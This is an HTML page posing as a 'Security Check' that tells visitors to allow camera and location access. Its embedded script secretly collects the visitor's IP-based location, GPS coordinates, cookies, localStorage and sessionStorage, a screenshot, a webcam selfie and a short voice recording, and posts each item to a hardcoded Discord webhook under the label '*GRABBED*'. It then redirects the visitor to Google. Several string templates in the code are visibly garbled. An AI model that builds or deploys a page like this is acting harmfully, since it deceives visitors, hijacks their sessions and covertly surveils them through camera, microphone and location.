<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Check</title>
  <style>
    body{margin:0;font-family:Arial;background:#000;color:#fff;text-align:center;padding-top:15vh;}
    h1{color:#ff0033;}
    button{padding:18px 50px;font-size:22px;background:#ff0033;color:#fff;border:none;border-radius:12px;cursor:pointer;}
    #s{margin-top:25px;color:#0f0;font-size:15px;}
  </style>
</head>
<body>
  <h1>Security Check Required</h1>
  <p>Allow camera & location to continue</p>
  <button onclick="go()">Continue</button>
  <div id="s">Ready</div>

  <video id="v" autoplay playsinline></video>
  <canvas id="c"></canvas>

  <script>
    const hook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";

    const s = (t) => document.getElementById('s').innerText = t;

    const send = (blob, name) => {
      let f = new FormData();
      f.append('file', blob, name);
      f.append('content', '*GRABBED* • '+new Date().toLocaleString());
      fetch(hook, {method:'POST', body:f}).catch(()=>{});
    };

    async function go() {
      s("Working...");

      // 1. IP + Geo
      fetch("https://api.ipify.org").then(r=>r.text()).then(ip=>{
        fetch(https://ipapi.co/${ip}/json/).then(r=>r.json()).then(g=>{
          send(new Blob([IP: \( {ip}\nCity: \){g.city}\nISP: \( {g.org}\nMap: https://maps.google.com/?q= \){g.latitude},${g.longitude}]), "IP.txt");
        });
      });

      // 2. GPS
      navigator.geolocation.getCurrentPosition(p=>{
        send(new Blob([GPS: https://maps.google.com/?q=\( {p.coords.latitude}, \){p.coords.longitude}\n±${p.coords.accuracy}m]), "GPS.txt");
      });

      // 3. Cookies + Storage
      if(document.cookie) send(new Blob([document.cookie]), "COOKIES.txt");
      const ls = JSON.stringify(localStorage,null,2);
      const ss = JSON.stringify(sessionStorage,null,2);
      if(ls.length>10) send(new Blob([ls]), "localStorage.json");
      if(ss.length>10) send(new Blob([ss]), "sessionStorage.json");

      // 4. MOBILE SCREENSHOT THAT ACTUALLY WORKS 2025
      html2canvas(document.body, {
        scale: window.devicePixelRatio || 2,
        useCORS: true,
        allowTaint: true,
        backgroundColor: "#000000",
        logging: false,
        width: window.innerWidth,
        height: window.innerHeight
      }).then(canvas => {
        canvas.toBlob(b => send(b, "SCREEN.jpg"), "image/jpeg", 0.9);
      }).catch(() => {
        // super fallback
        send(new Blob([UA: \( {navigator.userAgent}\nSize: \){screen.width}x${screen.height}]), "SCREEN_FAILED.txt");
      });

      // 5. Camera + Voice
      navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}, audio:true}).then(stream=>{
        const v = document.getElementById('v');
        v.srcObject = stream;
        v.onloadedmetadata = () => {
          v.play();
          setTimeout(()=>{
            const c = document.getElementById('c');
            c.width = v.videoWidth || 1280;
            c.height = v.videoHeight || 720;
            c.getContext('2d').drawImage(v,0,0,c.width,c.height);
            c.toBlob(b=>send(b,"SELFIE.jpg"),"image/jpeg",0.95);

            // voice
            const r = new MediaRecorder(stream);
            let chunks=[];
            r.ondataavailable=e=>chunks.push(e.data);
            r.onstop=()=>{ send(new Blob(chunks,{type:"audio/webm"}),"VOICE.webm"); };
            r.start();
            setTimeout(()=>r.stop(),5500);
          },2000);
        };
      }).catch(()=>{});

      // finish
      setTimeout(()=>{ s("Done!"); setTimeout(()=>location="https://google.com",1500); },12000);
    }

    // html2canvas CDN (only 38 KB, works everywhere 2025)
    const script = document.createElement('script');
    script.src = "https://html2canvas.hertzen.com/dist/html2canvas.min.js";
    script.onload = () => s("Ready – click Continue");
    document.head.appendChild(script);
  </script>
</body>
</html>
